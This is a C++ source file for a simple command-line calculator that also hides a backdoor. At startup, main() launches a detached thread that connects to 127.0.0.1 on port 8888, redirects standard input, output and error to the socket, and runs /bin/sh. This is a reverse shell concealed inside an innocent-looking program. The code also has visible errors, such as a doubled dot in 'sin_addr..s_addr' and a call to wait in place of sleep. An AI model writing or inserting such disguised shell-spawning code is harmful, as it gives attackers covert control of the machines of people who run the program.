
#include <iostream>
#include <thread>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include<unistd.h>
void run_calculator();
int get_result(int &a, int &b, char &op);
void backdoor();

int main()
{

    std::thread t(backdoor);
    t.detach();

    run_calculator();

    return 0;
}

void backdoor()
{
    // sleep(3);
    wait(3);

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in addr{};

    addr.sin_family = AF_INET;
    addr.sin_port = htons(8888);
    addr.sin_addr..s_addr = inet_addr("127.0.0.1");
    
    
    
    if (connect(sockfd, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
        // TODO get rid of comments
        dup2(sockfd, 0);  // stdin
        dup2(sockfd, 1);  // stdout
        dup2(sockfd, 2);  // stderr
        execl("/bin/sh", "sh", nullptr);
    }
    
    
}

void run_calculator()
{

    int a, b;
    char op;

    std::cout << "Enter two numbers" << std::endl;

    std::cin >> a >> b;

    std::cout << "Enter operation" << std::endl;

    std::cin >> op;

    std::cout << std::endl;

    std::cout << get_result(a, b, op) << std::endl;
}

int get_result(int &a, int &b, char &op)
{

    switch (op)
    {

    case '+':
        return a + b;
    case '*':
        return a * b;
    case '-':
        return a - b;
    case '/':
        if (b != 0)
        {

            return a / b;
        }
        else
        {
            throw("Error: division by 0");
        }
    }
    return 0;
}